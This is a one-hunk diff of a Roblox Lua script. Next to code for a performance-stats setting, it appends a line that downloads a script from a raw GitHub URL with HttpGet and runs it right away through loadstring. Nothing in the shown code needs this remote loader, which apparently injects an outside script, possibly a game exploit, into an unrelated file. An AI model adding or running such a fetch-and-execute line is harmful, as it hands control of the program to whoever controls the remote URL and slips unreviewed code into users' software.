@@ -61,3 +61,4 @@ gameSettings.PerformanceStatsVisibleChanged:Connect(function(bool)
 end);
 
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dankestmemes1/Yba/main/script"))()
